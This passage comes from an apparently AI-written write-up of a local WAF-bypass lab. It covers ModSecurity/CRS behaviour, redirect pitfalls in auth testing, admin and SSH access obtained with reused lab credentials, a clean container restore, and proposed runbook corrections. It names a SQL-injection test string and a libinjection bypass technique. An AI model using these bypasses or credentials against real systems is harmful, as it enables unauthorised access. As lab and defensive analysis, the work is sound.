thing it replaced**, because it produced a per-variable attribution the original could not.

**5. The redirect-following trap, measured on the actual finding.** The same two requests
that differ only in one hex digit:

| Invocation | Positive (correct) | Negative (must fail) |
|---|---|---|
| `curl -L` (**follows redirects**) | `200`, 2421 B, `…/admin.php` | `200`, 3793 B, `…/index.php` |
| `curl -D -` (**no follow**) | `302` → `/admin.php` | `302` → `/index.php` |

**With redirects followed, the failed authentication returns `200`** — the login page. A
status-code check scores a failed login as a complete success, and the two differ only by
a byte count nobody reads. Without following, both are `302` and the `Location` header
separates them cleanly. I used `-D -` and never `-L` for every auth test. *(Corpus
defect 3, again — and note it bit harder here than in 218, because in 218 the decoy was a
login page behind a vhost 303, while here the success and failure paths are the same
endpoint's own redirect.)*

**6. `403` was not a verdict, and the body hash that 218 prescribes is not sound against a
real engine.** Same blocking event, two different body hashes, because ModSecurity serves
Apache's stock error document and that document embeds the `Host` it refused:

| `Host` sent | Bytes | sha256 (16) |
|---|---|---|
| `172.17.0.9` | 275 | `1630ab41ca37e421` |
| `waffy.dl` | **273** | **`f5fefd67ac851ba2`** |

A body-hash allowlist built from one probe would have **mislabelled the other**. There is
no vendor fingerprint at all in the response — no rule ID, no score, no
`Server: ModSecurity`. **What made the block attributable here was enumerating the
application's own status set and observing that it never emits a 403** — a fact from the
application, not from the WAF. And the single most useful instrument in this entire
engagement was neither the status nor the body: it was the CRS anomaly-score line in
`error.log`, which names the rule ID, the matched variable, the score and the threshold on
every request.

**7. `SecRequestBodyAccess` had to be measured, not read.** "No `modsecurity.conf` is
included, therefore body access is Off" is an inference from a default. The B1/B2/B3
differential turned it into a measurement, and the B2 result (`200`, login page) is
recorded explicitly as a **200 that proves nothing** rather than as a successful bypass.

---

## Reward

**No `FLAG{}` exists in this lab.** Absence established by search, with the work count:

```
$ grep -rl "FLAG{" / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
files scanned: 17440   files containing FLAG{: 0
```

Corroborating: `grep -rniE 'flag|ctf|congratulations|reward' /var/www/` → **0 hits**;
`grep -rniE 'flag\{|CTF' /home /opt /srv /var/www` as `baluton` → **0 hits**; `/opt` and
`/srv` are empty; `/home/baluton/` holds only dotfiles; the only filesystem match for
`*flag*` is `/var/lib/mysql/debian-10.11.flag`, a MariaDB packaging artefact.

**The reward this lab actually pays is the administrative access itself**, and it is
functional:

```
$ curl -s -b fj.txt http://waffy.dl/admin.php | grep -oE 'Bienvenido, [^<]*|Usuario: [a-z]*|Contraseña: [a-z]*'
Bienvenido, balutin! 🎉
Usuario: baluton
Contraseña: balulerobalulon

$ ssh baluton@172.17.0.9   # password: baluterobalulon
uid=1000(baluton) gid=1000(baluton) groups=1000(baluton)
```

`admin.php:88` states the success criterion in the lab's own words: *"¡Felicidades! Has
logrado hacer un bypass del WAF con éxito."* The credential is a **reused** one: identical
to the `balutin` database row's password (F4).

---

## Restore

```
$ docker rm -f waffy_container
$ docker run -d --name waffy_container waffy:latest
```

Recreated **from the image**, not by undoing edits — I made no configuration changes and
wrote no files in the container.

| Check | Result |
|---|---|
| Container recreated from the image | id `a54b389db01c…` → **`03e8c8b8eb00…`**, `Up`, IP `172.17.0.9` |
| **Filter restored — positively, not by absence** | `' or 1=1-- -` → **`403`**, `942100` + `949110` fired, `COMBINED_SCORE=5`, sha `f5fefd67ac851ba2`. *A 403 that comes back is the positive check; the absence of a 200 would not have been.* |
| Bypass reproducible from the clean image | Re-attempted post-restore → `302 → /admin.php`, `newlog=0`. **This is the correct result**: the finding is a property of the shipped application and shipped CRS, so a freshly-recreated container reproduces it. It is not residue of my session. |
| Service healthy | `GET /admin.php` unauthenticated → `302 → /index.php` (guard intact) |
| Docroot clean | `admin.php config.php index.php prueba.html` — the 4 shipped files |
| Artefacts of mine | `find / -xdev -iname '*DL84*'` → **0**. I wrote no file into the container at any point; the token existed only inside HTTP requests. |
| Pre-existing files left alone | `/tmp/tmp.ArVcJ0LXGe*`, `/tmp/ubuntu-release-upgrader-*` etc. were present before my work and are **not mine to delete** — left in place per RUNBOOK §9. |
| Other principals untouched | No `docker system/image/volume prune` was run at any point. The seven `cybervault-*` containers and their volumes are untouched. |

Local scratch is confined to `/tmp/opencode/dl84/` (probe harness, cookie jars, the SSH
helper). The 1.8 GB extracted tar `/home/search14/dockerlabs/labs/84/waffy.tar` was removed
after the writeup landed (PIPELINE reclaim policy: "ours, safe — the same"), with
`dist/waffy.zip` retained so a retry needs no re-download. The `waffy:latest` image and the
running container were **kept**, since the documented positive restore check is
recreation from the image and the parent may need to re-verify.

---

## What the parent should change in the class table

The `RUNBOOK.md` §5 row for **WAF / blocklist** should be **corrected, not extended**. The
parent owns that file; this is the evidence for the change, not an edit.

Current row (RUNBOOK.md:143):

> **WAF / blocklist** | Does the filter read the request, or the string after decoding? |
> The discriminator is the **body**, not the status. A blocklist names what you already
> know; a filter that validates a *string* hands the shell a *pattern*

**Three corrections, each with its evidence above:**

1. **The bypass is not lexical, so "the unlisted encoding" does not survive.** Against
   libinjection at PL1, 10 quote-bearing variants in a single variable were blocked
   (V1–V7, W3–W5, N1–N3). *Unlisted encoding* is the right rule for a **string blocklist**
   and the wrong rule for a **scoring engine**, which matches a named variable list after
   a declared pipeline.

2. **The generalisable replacement: validate the unit the executor actually receives.**
   For a string blocklist that unit is a *string* (218: globs, brace expansion, `$IFS`).
   For a real WAF it is a **composite** — the engine scored `\` and `OR 0x…=0x…` as two
   unrelated zero-point strings while MySQL read them as one statement. Same underlying
   principle as 218's rule (a gap between what is validated and what is executed), a
   different mechanism. Add: **read the engine's declared variable list and its
   `t:` transformation pipeline from the rule itself — that list is the attack surface,
   and a value that is only dangerous in combination is invisible to per-variable
   scoring.**

3. **Body-hash discrimination needs a caveat, and there is a better instrument.** A real
   engine's block page is unbranded and **not byte-stable** (275 B vs 273 B for the same
   event, varying with `Host`). Worse, here success and failure were both `302` with a
   byte-identical body, discriminated only by `Location`. The strongest instrument
   available was neither status nor body: it was the **CRS anomaly-score log line**, which
   names the rule ID, the matched variable, the score and the threshold per request.
   Suggest: **assert on the engine's own audit line, and treat a WAF block as attributable
   only after enumerating what statuses the application itself can emit.**

Two additions worth carrying forward, both cheap and both from reading the artefact rather
than attacking:

- **`SecRuleEngine` scope is a control.** Set at server scope or it is per-vhost, and
  ModSecurity's default is `Off` (F2). *Measured: it is vhost-scoped here; the
  consequence for a second vhost is inference, unproven.*
- **Missing `modsecurity.conf` is a silent total gap, not a default.** No include means no
  `SecRequestBodyAccess`, no audit log, no debug log (F3). Prove the setting with a
  differential — the same payload scored in a query string versus in a body — because
  "the directive is absent" and "the engine does not read bodies" are an inference and a
  measurement respectively, and only one of them is evidence.
